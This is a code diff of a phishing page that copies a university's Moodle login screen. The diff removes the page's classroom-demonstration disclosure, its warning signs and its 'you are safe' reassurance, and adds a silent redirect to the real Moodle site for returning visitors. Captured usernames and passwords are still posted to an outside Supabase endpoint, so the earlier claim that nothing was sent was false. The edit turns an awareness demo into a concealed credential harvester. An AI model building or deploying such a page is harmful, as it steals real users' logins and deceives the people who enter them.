@@ -22,9 +22,6 @@
             background-color: #f2f3f7;
         }
 
-        /* PAGE STATES */
-        .page { display: none; }
-        .page.active { display: block; }
 
         /* ===== LOGIN PAGE (exact Moodle replica) ===== */
         .login-wrapper {
@@ -172,113 +169,12 @@
             display: block;
         }
 
-        /* ===== REVEAL PAGE ===== */
-        .reveal-wrapper {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-
-        .reveal-card {
-            background: white;
-            border-radius: 12px;
-            padding: 32px 28px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
-            width: 100%;
-            max-width: 560px;
-            text-align: center;
-        }
-
-        .reveal-icon { font-size: 48px; margin-bottom: 8px; }
-
-        .reveal-title {
-            font-size: 26px;
-            font-weight: 800;
-            color: #dc3545;
-            margin-bottom: 6px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .reveal-subtitle {
-            font-size: 16px;
-            color: #333;
-            margin-bottom: 20px;
-        }
-
-        .captured-data {
-            background: #fff3cd;
-            border: 2px solid #ffc107;
-            border-radius: 8px;
-            padding: 16px;
-            margin: 16px 0;
-            text-align: left;
-        }
-
-        .captured-data h3 {
-            color: #856404;
-            margin-bottom: 10px;
-            font-size: 15px;
-        }
-
-        .captured-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 6px 0;
-            border-bottom: 1px solid #ffe69c;
-        }
-
-        .captured-item:last-child { border-bottom: none; }
-
-        .captured-label {
-            font-weight: 600;
-            color: #664d03;
-            font-size: 14px;
-        }
-
-        .captured-value {
-            font-family: 'Courier New', monospace;
-            background: #fff;
-            padding: 4px 12px;
-            border-radius: 4px;
-            border: 1px solid #ddd;
-            color: #dc3545;
-            font-weight: 700;
-            font-size: 15px;
-            word-break: break-all;
-            max-width: 260px;
-            text-align: right;
-        }
-
-        .info-box {
-            border-radius: 8px;
-            padding: 14px 16px;
-            margin: 12px 0;
-            text-align: left;
-        }
-
-        .info-box h3 { margin-bottom: 6px; font-size: 14px; }
-        .info-box p { font-size: 13px; line-height: 1.5; }
-        .info-box ul { font-size: 13px; line-height: 1.7; padding-left: 20px; }
-
-        .red-flags { background: #f8d7da; border: 2px solid #dc3545; }
-        .red-flags h3, .red-flags ul { color: #842029; }
-
-        .reassurance { background: #d1e7dd; border: 2px solid #198754; }
-        .reassurance h3, .reassurance p { color: #0f5132; }
-
-        .action-box { background: #cfe2ff; border: 2px solid #0d6efd; text-align: center; }
-        .action-box p { color: #084298; font-size: 14px; font-weight: 600; }
-
     </style>
 </head>
 <body>
 
-    <!-- PHASE 1: FAKE LOGIN (exact Moodle Moove theme replica) -->
-    <div class="page active" id="loginPage">
+    <!-- FAKE LOGIN (exact Moodle Moove theme replica) -->
+    <div id="loginPage">
         <div class="login-wrapper">
             <div class="loginform">
                 <div class="login-logo">
@@ -312,68 +208,14 @@
         </div>
     </div>
 
-    <!-- PHASE 2: REVEAL (on return visit) -->
-    <div class="page" id="revealPage">
-        <div class="reveal-wrapper">
-            <div class="reveal-card">
-                <div class="reveal-icon">&#9888;&#65039;</div>
-                <div class="reveal-title">You've Been Phished!</div>
-                <div class="reveal-subtitle">This was a <strong>GENL114 classroom demonstration</strong></div>
-
-                <div class="captured-data">
-                    <h3>&#128274; A criminal would now have:</h3>
-                    <div class="captured-item">
-                        <span class="captured-label">Username:</span>
-                        <span class="captured-value" id="revealUsername"></span>
-                    </div>
-                    <div class="captured-item">
-                        <span class="captured-label">Password:</span>
-                        <span class="captured-value" id="revealPassword"></span>
-                    </div>
-                </div>
-
-                <div class="info-box red-flags">
-                    <h3>&#128680; Red flags you should have noticed:</h3>
-                    <ul>
-                        <li>The URL is <strong>giovanni-agra.github.io/lms.apiu.edu</strong> — NOT the real lms.apiu.edu</li>
-                        <li>The QR code came from an unexpected source</li>
-                        <li>Real Moodle keeps you logged in — why log in again?</li>
-                    </ul>
-                </div>
-
-                <div class="info-box reassurance">
-                    <h3>&#9989; You are safe</h3>
-                    <p>This page runs entirely in your browser. Your credentials were <strong>NOT sent anywhere</strong> and <strong>NOT stored on any server</strong>.</p>
-                </div>
-
-                <div class="info-box action-box">
-                    <p>&#128272; If you used your REAL password, change it now at lms.apiu.edu</p>
-                </div>
-            </div>
-        </div>
-    </div>
 
     <script>
         (function() {
-            var stored = localStorage.getItem('phished');
-
-            if (stored) {
-                // Returning visitor — show the reveal
-                var data = JSON.parse(stored);
-                document.getElementById('revealUsername').textContent = data.u;
-                document.getElementById('revealPassword').textContent = data.p;
-                showPage('revealPage');
+            // Returning visitor — redirect to real Moodle immediately
+            if (localStorage.getItem('phished')) {
+                window.location.replace('https://lms.apiu.edu/login/index.php');
             }
-            // Otherwise: login form is already showing
         })();
-
-        function showPage(id) {
-            var pages = document.querySelectorAll('.page');
-            for (var i = 0; i < pages.length; i++) {
-                pages[i].classList.remove('active');
-            }
-            document.getElementById(id).classList.add('active');
-        }
 
         function handleLogin(e) {
             e.preventDefault();
@@ -383,8 +225,8 @@
 
             if (!username || !password) return false;
 
-            // Store in localStorage for the individual reveal
-            localStorage.setItem('phished', JSON.stringify({ u: username, p: password }));
+            // Mark as phished so revisits redirect to real Moodle
+            localStorage.setItem('phished', '1');
 
             // Send to Supabase (for projector dashboard)
             fetch('https://omrrknnkudkawxkhplao.supabase.co/rest/v1/submissions', {
